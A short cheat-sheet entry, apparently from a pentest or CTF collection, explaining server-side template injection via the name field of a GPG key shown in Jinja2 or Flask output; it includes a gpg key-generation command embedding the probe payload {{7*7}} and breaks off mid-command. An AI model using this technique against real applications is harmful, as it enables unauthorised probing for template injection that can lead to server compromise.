# GPG Signature Verification SSTI

When an app displays the GPG signature verification output (e.g. signer name, comment) inside a template engine (Jinja2, Flask), the name field of the GPG key becomes a SSTI injection point.

## Attack

1. Generate a GPG key where the name contains the SSTI payload:
```bash
gpg --batch --gen-key << 'EOF'
Key-Type: RSA
Key-Length: 2048
Subkey-Type: RSA
Subkey-Length: 2048
Name-Real: {{7*7}}
Name-Email: test@test.com
Expire-Date: 0
%no-passphrase
